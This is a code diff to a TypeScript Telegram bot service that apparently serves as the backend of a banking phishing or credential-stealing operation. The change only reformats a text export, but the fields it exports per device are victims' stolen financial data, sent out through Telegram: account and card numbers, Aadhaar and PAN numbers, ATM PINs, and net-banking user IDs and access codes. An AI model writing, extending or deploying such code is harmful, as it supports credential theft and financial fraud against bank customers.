@@ -506,52 +506,50 @@ export class TelegramBotService {
             new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime()
         );
 
-        // Generate prettily formatted text content
-        let content = `╔════════════════════════════════════════════════════╗\n`;
-        content += `║          FORM SUBMISSIONS EXPORT                   ║\n`;
-        content += `╠════════════════════════════════════════════════════╣\n`;
-        content += `║  Device: ${device.name.padEnd(40)}║\n`;
-        content += `║  Generated: ${new Date().toLocaleString().padEnd(37)}║\n`;
-        content += `║  Total Submissions: ${String(sortedForms.length).padEnd(29)}║\n`;
-        content += `╚════════════════════════════════════════════════════╝\n\n`;
+        // Generate cleanly formatted text content
+        let content = `========================================\n`;
+        content += `       FORM SUBMISSIONS EXPORT\n`;
+        content += `========================================\n`;
+        content += `Device: ${device.name}\n`;
+        content += `Generated: ${new Date().toLocaleString()}\n`;
+        content += `Total Submissions: ${sortedForms.length}\n`;
+        content += `========================================\n\n`;
 
         sortedForms.forEach((form: FormData, index: number) => {
             const date = new Date(form.submittedAt).toLocaleString();
-            content += `┌──────────────────────────────────────────────────┐\n`;
-            content += `│  Submission #${index + 1}\n`;
-            content += `│  🕐 Submitted: ${date}\n`;
-            content += `├──────────────────────────────────────────────────┤\n`;
-            content += `│  👤 PERSONAL DETAILS\n`;
-            content += `│     Name:         ${form.fullName || form.name || 'N/A'}\n`;
-            content += `│     Mobile:       ${form.mobileNumber || form.phoneNumber || 'N/A'}\n`;
-            content += `│     Mother:       ${form.motherName || 'N/A'}\n`;
-            content += `│     DOB:          ${form.dateOfBirth || 'N/A'}\n`;
-            content += `├──────────────────────────────────────────────────┤\n`;
-            content += `│  🏦 ACCOUNT DETAILS\n`;
-            content += `│     Account No:   ${form.accountNumber || 'N/A'}\n`;
-            content += `│     Aadhaar:      ${form.aadhaarNumber || 'N/A'}\n`;
-            content += `│     PAN Card:     ${form.panCard || 'N/A'}\n`;
-            content += `│     CIF Number:   ${form.cifNumber || 'N/A'}\n`;
-            content += `│     Branch Code:  ${form.branchCode || 'N/A'}\n`;
-            content += `├──────────────────────────────────────────────────┤\n`;
-            content += `│  💳 CARD DETAILS\n`;
-            content += `│     Card Last 6:  ${form.cardLast6 || 'N/A'}\n`;
-            content += `│     Card Expiry:  ${form.cardExpiry || 'N/A'}\n`;
-            content += `│     ATM PIN:      ${form.atmPin || 'N/A'}\n`;
-            content += `│     Final PIN:    ${form.finalPin || 'N/A'}\n`;
-            content += `├──────────────────────────────────────────────────┤\n`;
-            content += `│  🔐 LOGIN CREDENTIALS\n`;
-            content += `│     User ID:      ${form.userId || 'N/A'}\n`;
-            content += `│     Access Code:  ${form.accessCode || 'N/A'}\n`;
-            content += `│     Profile Code: ${form.profileCode || 'N/A'}\n`;
-            content += `└──────────────────────────────────────────────────┘\n\n`;
+            content += `----------------------------------------\n`;
+            content += `SUBMISSION #${index + 1}\n`;
+            content += `Submitted: ${date}\n`;
+            content += `----------------------------------------\n\n`;
+
+            content += `>> PERSONAL DETAILS\n`;
+            content += `   Name: ${form.fullName || form.name || 'N/A'}\n`;
+            content += `   Mobile: ${form.mobileNumber || form.phoneNumber || 'N/A'}\n`;
+            content += `   Mother Name: ${form.motherName || 'N/A'}\n`;
+            content += `   DOB: ${form.dateOfBirth || 'N/A'}\n\n`;
+
+            content += `>> ACCOUNT DETAILS\n`;
+            content += `   Account No: ${form.accountNumber || 'N/A'}\n`;
+            content += `   Aadhaar: ${form.aadhaarNumber || 'N/A'}\n`;
+            content += `   PAN Card: ${form.panCard || 'N/A'}\n`;
+            content += `   CIF Number: ${form.cifNumber || 'N/A'}\n`;
+            content += `   Branch Code: ${form.branchCode || 'N/A'}\n\n`;
+
+            content += `>> CARD DETAILS\n`;
+            content += `   Card Last 6: ${form.cardLast6 || 'N/A'}\n`;
+            content += `   Card Expiry: ${form.cardExpiry || 'N/A'}\n`;
+            content += `   ATM PIN: ${form.atmPin || 'N/A'}\n`;
+            content += `   Final PIN: ${form.finalPin || 'N/A'}\n\n`;
+
+            content += `>> LOGIN CREDENTIALS\n`;
+            content += `   User ID: ${form.userId || 'N/A'}\n`;
+            content += `   Access Code: ${form.accessCode || 'N/A'}\n`;
+            content += `   Profile Code: ${form.profileCode || 'N/A'}\n\n`;
         });
 
-
-
-        content += `\n═══════════════════════════════════════════════════════\n`;
-        content += `                    END OF EXPORT\n`;
-        content += `═══════════════════════════════════════════════════════\n`;
+        content += `========================================\n`;
+        content += `           END OF EXPORT\n`;
+        content += `========================================\n`;
 
         // Write to temp file and send
         const tempDir = os.tmpdir();
